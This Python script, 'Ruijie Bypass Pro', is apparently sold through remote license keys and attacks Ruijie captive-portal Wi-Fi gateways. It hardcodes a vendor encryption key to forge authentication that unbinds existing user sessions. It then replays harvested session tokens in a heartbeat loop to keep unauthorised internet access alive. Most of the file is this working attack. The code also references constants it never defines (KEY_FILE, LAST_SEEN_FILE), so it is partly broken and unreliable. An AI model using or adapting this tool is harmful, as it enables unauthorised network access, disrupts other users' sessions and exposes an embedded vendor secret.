#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ruijie Bypass Pro - Enhanced Edition
Author: HeaNg[Black-Cyber] | MeNgHeaNg
Version: 2.0 (Galaxy-Ready)
"""

import os
import sys
import re
import time
import json
import base64
import random
import string
import hashlib
import asyncio
import aiohttp
import requests
import subprocess
import getpass
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs, unquote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# ================================
# 🌌 COLOR SCHEME (Galaxy Dark Mode)
# ================================
class Colors:
    RESET = "\033[0m"
    RED = "\033[38;5;196m"
    GREEN = "\033[38;5;46m"
    YELLOW = "\033[38;5;226m"
    BLUE = "\033[38;5;39m"
    CYAN = "\033[38;5;51m"
    MAGENTA = "\033[38;5;201m"
    WHITE = "\033[38;5;255m"
    GRAY = "\033[38;5;240m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    BG_DARK = "\033[48;5;232m"

C = Colors()

# ================================
# 🧩 CONFIGURATION
# ================================
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=4c49680dc1b3&gw_sn=H1U824U009044&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.2&mac=02:18:4c:49:fb:ca&slot_num=11&nasip=192.168.1.26&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C351&chap_challenge=%5C253%5C045%5C130%5C251%5C100%5C117%5C225%5C006%5C246%5C077%5C142%5C175%5C357%5C310%5C002%5C013"
RAW_KEY_LINK = "https://raw.githubusercontent.com/kuranomi10/Bot/refs/heads/main/keys.txt"
LOG_FILE = "bypass_history.log"
DEVICE_ID_FILE = ".device_id"


# ================================
# 🛠 UTILITY FUNCTIONS
# ================================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_separator(char="═", length=None):
    if length is None:
        try:
            length = os.get_terminal_size().columns
        except:
            length = 80
    print(f"{C.GRAY}{char * length}{C.RESET}")

def print_header(text):
    clear()
    print(f"{C.CYAN}{C.BOLD}╔{'═' * 58}╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET} {C.MAGENTA}{C.BOLD}🚀 RUIJIE BYPASS PRO v2.0{C.RESET}{' ' * (58 - len('🚀 RUIJIE BYPASS PRO v2.0') - 2)} {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}║{C.RESET} {C.WHITE}🔧 Galaxy-Grade Internet Freedom Tool{C.RESET}{' ' * (58 - len('🔧 Galaxy-Grade Internet Freedom Tool') - 2)} {C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}╚{'═' * 58}╝{C.RESET}")
    print(f"{C.DIM}{' ' * 10}⚡ Owner: MeNgHeaNg | AI: HeaNg[Black-Cyber] ⚡{C.RESET}")
    print_separator()

def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        try:
            with open(DEVICE_ID_FILE, "r") as f:
                return f.read().strip()
        except:
            pass
    try:
        raw = subprocess.check_output("whoami", shell=True, encoding='utf-8').strip()
        clean = re.sub(r'[^A-Za-z0-9]', '', raw).upper()[:6].ljust(6, 'X')
        dev_id = f"RUI-{clean}"
    except:
        clean = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        dev_id = f"RUI-{clean}"
    with open(DEVICE_ID_FILE, "w") as f:
        f.write(dev_id)
    return dev_id

def get_network_time():
    try:
        res = requests.get("https://www.google.com", timeout=5)
        gmt_str = res.headers.get('Date')
        gmt_dt = datetime.strptime(gmt_str, '%a, %d %b %Y %H:%M:%S %Z')
        return gmt_dt + timedelta(hours=6, minutes=30)
    except:
        return None

def parse_duration(dur_str):
    days = re.search(r'(\d+)\s*(d|day|days)', dur_str, re.I)
    hours = re.search(r'(\d+)\s*(h|hour|hours)', dur_str, re.I)
    mins = re.search(r'(\d+)\s*(m|min|minute|minutes)', dur_str, re.I)
    d = int(days.group(1)) if days else 0
    h = int(hours.group(1)) if hours else 0
    m = int(mins.group(1)) if mins else 0
    return timedelta(days=d, hours=h, minutes=m)

def format_duration(td):
    if td is None:
        return "∞"
    days = td.days
    hours = td.seconds // 3600
    mins = (td.seconds % 3600) // 60
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {mins}m"
    else:
        return f"{mins}m"

def write_log(msg):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

# ================================
# 🔐 LICENSE SYSTEM
# ================================
def check_license(user_key):
    dev_id = get_device_id()
    net_time = get_network_time()
    curr_time = datetime.now()
    
    if os.path.exists(LAST_SEEN_FILE):
        try:
            last_ts = float(open(LAST_SEEN_FILE).read().strip())
            if curr_time.timestamp() < last_ts:
                return False, "⛔ Time Travel Detected!"
        except:
            pass
    
    current_time = net_time if net_time else curr_time
    with open(LAST_SEEN_FILE, "w") as f:
        f.write(str(current_time.timestamp()))
    
    try:
        res = requests.get(RAW_KEY_LINK, timeout=10)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if "|" in line:
                    parts = [p.strip() for p in line.split("|")]
                    if len(parts) >= 3 and parts[0] == dev_id and parts[1] == user_key:
                        duration_str = parts[2]
                        if os.path.exists(KEY_FILE):
                            saved = open(KEY_FILE).read().strip().split("|")
                            expiry = datetime.fromtimestamp(float(saved[1]))
                        else:
                            if not net_time:
                                return None, "🌐 Internet required for activation!"
                            delta = parse_duration(duration_str)
                            if delta.total_seconds() == 0:
                                return False, "⛔ Invalid duration!"
                            expiry = net_time + delta
                            with open(KEY_FILE, "w") as f:
                                f.write(f"{user_key}|{expiry.timestamp()}")
                        if current_time < expiry:
                            return True, expiry
                        else:
                            if os.path.exists(KEY_FILE):
                                os.remove(KEY_FILE)
                            return False, "⏰ Key expired!"
            return False, "🔑 Key not found on server!"
    except Exception as e:
        if os.path.exists(KEY_FILE):
            try:
                saved = open(KEY_FILE).read().strip().split("|")
                expiry = datetime.fromtimestamp(float(saved[1]))
                if curr_time < expiry:
                    return True, expiry
                return False, "⏰ Expired (offline)"
            except:
                pass
        return None, f"⚠️ Server error: {e}"
    return False, "❌ Access denied"

def activate_key(user_key):
    status, info = check_license(user_key)
    if status is True:
        try:
            with open(KEY_FILE, "r+") as f:
                content = f.read().strip()
                if "|" in content:
                    old_exp = content.split("|")[1]
                    f.seek(0)
                    f.write(f"{user_key}|{old_exp}")
                else:
                    f.write(user_key)
        except:
            with open(KEY_FILE, "w") as f:
                f.write(user_key)
        return True, info
    return False, info

def get_key_status():
    if os.path.exists(KEY_FILE):
        try:
            content = open(KEY_FILE).read().strip()
            if "|" in content:
                key, exp_ts = content.split("|")
                expiry = datetime.fromtimestamp(float(exp_ts))
                net_time = get_network_time()
                now = net_time if net_time else datetime.now()
                if now < expiry:
                    return True, key, expiry, expiry - now
                return False, key, expiry, None
            return None, content, None, None
        except:
            pass
    return None, None, None, None

# ================================
# 🖥 UI DASHBOARD
# ================================
def show_dashboard():
    print_header("RUIJIE BYPASS PRO")
    dev_id = get_device_id()
    has_key, key_val, exp_dt, remaining = get_key_status()
    
    if has_key is True:
        status = f"{C.GREEN}● ACTIVE{C.RESET}"
        time_left = format_duration(remaining)
    elif has_key is False:
        status = f"{C.RED}● EXPIRED{C.RESET}"
        time_left = f"{C.RED}Expired{C.RESET}"
    else:
        status = f"{C.YELLOW}● NOT ACTIVATED{C.RESET}"
        time_left = f"{C.YELLOW}None{C.RESET}"
    
    print(f"""
{C.CYAN}┌────────────────────────────────────────────────────┐
│ {C.WHITE}🆔 Device ID{C.RESET}    : {C.GREEN}{dev_id}{C.RESET}{' ' * (50 - len(dev_id) - 18)}│
│ {C.WHITE}🔑 License Status{C.RESET}: {status}{' ' * (50 - len(status) - 20)}│
│ {C.WHITE}⏳ Time Remaining{C.RESET}: {time_left}{' ' * (50 - len(str(time_left)) - 22)}│
│ {C.WHITE}📡 Contact{C.RESET}      : {C.MAGENTA}@SKB4402{C.RESET}{' ' * (50 - len('@SKB4402') - 20)}│
{C.CYAN}└────────────────────────────────────────────────────┘{C.RESET}
""")

def show_menu():
    print(f"""
{C.YELLOW}┌───────────────────────────────────┐
│ {C.WHITE}🔧 MAIN MENU{C.YELLOW}                    │
├───────────────────────────────────┤
│ {C.CYAN}1{C.RESET} ⚙️  Wi-Fi Setup & Unbind      │
│ {C.CYAN}2{C.RESET} 🚀  Internet Bypass (Live)    │
│ {C.CYAN}3{C.RESET} 🔑  Activate License Key      │
│ {C.CYAN}4{C.RESET} 🧹  Clear Session & Logout    │
│ {C.CYAN}5{C.RESET} 📊  Show System Status        │
│ {C.CYAN}0{C.RESET} ❌  Exit                      │
└───────────────────────────────────┘{C.RESET}
""")

# ================================
# 🌐 CORE BYPASS ENGINE (Optimized)
# ================================
class RuijieBypass:
    def __init__(self, gw_address, chap_id, chap_challenge):
        self.base_url = f"http://{gw_address}:2060"
        self.gw_address = gw_address
        self.chap_id = chap_id
        self.chap_challenge = chap_challenge
        self.enc_key = "RjYkhwzx$2018!"
        self.session_url = TARGET_URL

    def unbind_session(self):
        print(f"{C.CYAN}[*] Attempting to unbind old session...{C.RESET}")
        try:
            username = requests.get(self.base_url + "/username_get", timeout=5).json().get("username")
            if not username:
                return False
            params = {"username": username, "usertype": "wifidog"}
            info = requests.get(self.base_url + "/user/online_info", params=params, timeout=5).json()
            data = info["data"]["list"][0]
            repmac = data["mac"].replace(":", "")
            repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
            logout_data = {
                "ip": data["ip"],
                "mac": data["mac"],
                "ip_req": data["ip"],
                "mac_req": ".".join(repmac)
            }
            if not self.chap_id or not self.chap_challenge:
                return False
            auth = unquote(self.chap_id) + unquote(self.chap_challenge) + username
            salt = get_random_bytes(8)
            key_iv = b''
            prev = b''
            while len(key_iv) < 48:
                prev = hashlib.md5(prev + self.enc_key.encode("utf-8") + salt).digest()
                key_iv += prev
            cipher = AES.new(key_iv[:32], AES.MODE_CBC, key_iv[32:48])
            encrypted = base64.b64encode(b"Salted__" + salt + cipher.encrypt(pad(auth.encode("utf-8"), AES.block_size))).decode()
            payload = f"ip={logout_data['ip']}&mac={logout_data['mac']}&ip_req={logout_data['ip_req']}&mac_req={logout_data['mac_req']}&auth={encrypted}"
            result = requests.post(self.base_url + "/user/logout", data=payload, timeout=5).json()
            return result.get("success", False)
        except Exception as e:
            print(f"{C.RED}[!] Unbind error: {e}{C.RESET}")
            return False

    async def get_session_id(self, session, previous=None):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        try:
            async with session.get(self.session_url, headers=headers, allow_redirects=True) as resp:
                url = str(resp.url)
                match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", url)
                if match:
                    return match.group(1)
                return previous
        except:
            return previous

    async def send_heartbeat(self, session, session_id):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        params = {'token': session_id, 'phoneNumber': 'HELLO WORLD'}
        try:
            async with session.get(f'http://{self.gw_address}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as resp:
                url = str(resp.url)
                if "baidu.com" in url or "success.html" in url:
                    return True
                return False
        except:
            return False

    async def run_bypass(self):
        show_dashboard()
        print(f"{C.CYAN}[*] Starting Bypass Engine...{C.RESET}")
        print_separator()
        
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(limit=512, ttl_dns_cache=300)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            session_id = None
            failures = 0
            refresh_counter = 0
            
            # Get initial session
            while session_id is None:
                print(f"{C.YELLOW}[*] Acquiring session ID...{C.RESET}")
                session_id = await self.get_session_id(session)
                if session_id:
                    print(f"{C.GREEN}[+] Session locked: {session_id[:12]}...{C.RESET}")
                else:
                    failures += 1
                    await asyncio.sleep(min(5 + failures, 15))
                if failures > 10:
                    print(f"{C.RED}[!] Failed to acquire session. Exiting.{C.RESET}")
                    return
            
            write_log("Bypass engine started.")
            failures = 0
            
            while True:
                try:
                    status = await self.send_heartbeat(session, session_id)
                    if status:
                        if failures > 0:
                            print(f"{C.GREEN}[+] Connection restored!{C.RESET}")
                            failures = 0
                        print(f"{C.GREEN}[+] {C.WHITE}● Connection Active | Session: {session_id[:8]}...{C.RESET}")
                        print_separator(".")
                    else:
                        failures += 1
                        print(f"{C.RED}[!] Heartbeat failed #{failures}{C.RESET}")
                        new_sid = await self.get_session_id(session, session_id)
                        if new_sid and new_sid != session_id:
                            session_id = new_sid
                            failures = 0
                            print(f"{C.GREEN}[+] Session renewed: {session_id[:12]}...{C.RESET}")
                        elif failures >= 8:
                            print(f"{C.RED}[!] Critical failure. Re-acquiring session...{C.RESET}")
                            session_id = None
                            while session_id is None:
                                session_id = await self.get_session_id(session)
                                await asyncio.sleep(2)
                            failures = 0
                            print(f"{C.GREEN}[+] Session re-acquired!{C.RESET}")
                    
                    refresh_counter += 1
                    if refresh_counter >= 18:
                        print(f"{C.CYAN}[*] Scheduled session refresh...{C.RESET}")
                        new_sid = await self.get_session_id(session, session_id)
                        if new_sid:
                            session_id = new_sid
                            print(f"{C.GREEN}[+] Refreshed: {session_id[:12]}...{C.RESET}")
                        refresh_counter = 0
                    
                    await asyncio.sleep(8)
                    
                except asyncio.TimeoutError:
                    print(f"{C.YELLOW}[!] Timeout. Retrying...{C.RESET}")
                    await asyncio.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{C.RED}[!] Stopped by user.{C.RESET}")
                    break
                except Exception as e:
                    print(f"{C.RED}[!] Error: {e}{C.RESET}")
                    write_log(f"Bypass error: {e}")
                    await asyncio.sleep(2)

# ================================
# 🎮 MAIN APPLICATION
# ================================
def parse_target():
    parsed = urlparse(TARGET_URL)
    params = parse_qs(parsed.query)
    gw_address = params.get('gw_address', ['192.168.110.1'])[0]
    chap_id = params.get('chap_id', [None])[0]
    chap_challenge = params.get('chap_challenge', [None])[0]
    return gw_address, chap_id, chap_challenge

def key_activation_flow():
    show_dashboard()
    print(f"{C.YELLOW}┌──────────────────────────────────────┐")
    print(f"│      🔑 LICENSE ACTIVATION            │")
    print(f"├──────────────────────────────────────┤")
    has_key, key_val, exp_dt, remaining = get_key_status()
    if has_key is True:
        print(f"│  {C.GREEN}✓ Active: {key_val}{C.RESET}{' ' * (28 - len(key_val))}│")
        print(f"│  ⏳ Left: {format_duration(remaining)}{' ' * (28 - len(format_duration(remaining)))}│")
    elif has_key is False:
        print(f"│  {C.RED}✗ Key Expired!{C.RESET}{' ' * 28}│")
    else:
        print(f"│  {C.YELLOW}⚠ No key installed{C.RESET}{' ' * 28}│")
    print(f"├──────────────────────────────────────┤")
    print(f"│  Contact {C.MAGENTA}@SKB4402{C.RESET} to get key │")
    print(f"└──────────────────────────────────────┘{C.RESET}")
    
    key = input(f"\n{C.GREEN}[>] Enter your key: {C.RESET}").strip()
    if not key:
        print(f"{C.RED}[!] Key cannot be empty.{C.RESET}")
        time.sleep(1.5)
        return
    
    print(f"{C.CYAN}[*] Verifying with server...{C.RESET}")
    status, info = activate_key(key)
    if status:
        if isinstance(info, datetime):
            print(f"{C.GREEN}[+] Activated! Expires: {info.strftime('%Y-%m-%d %H:%M:%S')}{C.RESET}")
        else:
            print(f"{C.GREEN}[+] Activated!{C.RESET}")
        write_log(f"Key activated: {key}")
    else:
        print(f"{C.RED}[!] Failed: {info}{C.RESET}")
        write_log(f"Activation failed: {key} - {info}")
    time.sleep(2)

async def main():
    gw_address, chap_id, chap_challenge = parse_target()
    bypass = RuijieBypass(gw_address, chap_id, chap_challenge)
    
    while True:
        show_dashboard()
        show_menu()
        choice = input(f"{C.CYAN}[>] Select: {C.RESET}").strip()
        
        if choice == '1':
            show_dashboard()
            print(f"{C.CYAN}[*] Running Wi-Fi Setup...{C.RESET}")
            if bypass.unbind_session():
                print(f"{C.GREEN}[+] Session unbound successfully!{C.RESET}")
            else:
                print(f"{C.YELLOW}[!] No active session to unbind.{C.RESET}")
            write_log("Wi-Fi setup executed.")
            input(f"\n{C.DIM}Press Enter to continue...{C.RESET}")
            
        elif choice == '2':
            has_key, _, _, _ = get_key_status()
            if has_key is not True:
                print(f"{C.RED}[!] License required! Activate first.{C.RESET}")
                time.sleep(2)
                continue
            await bypass.run_bypass()
            
        elif choice == '3':
            key_activation_flow()
            
        elif choice == '4':
            show_dashboard()
            print(f"{C.CYAN}[*] Clearing session...{C.RESET}")
            for f in [KEY_FILE, LAST_SEEN_FILE, DEVICE_ID_FILE]:
                if os.path.exists(f):
                    os.remove(f)
            print(f"{C.GREEN}[+] All session data cleared.{C.RESET}")
            write_log("Session cleared by user.")
            time.sleep(2)
            
        elif choice == '5':
            show_dashboard()
            input(f"\n{C.DIM}Press Enter to continue...{C.RESET}")
            
        elif choice == '0':
            print(f"{C.RED}[!] Exiting...{C.RESET}")
            write_log("User exited.")
            sys.exit(0)
            
        else:
            print(f"{C.RED}[!] Invalid choice.{C.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted.{C.RESET}")
        sys.exit(0)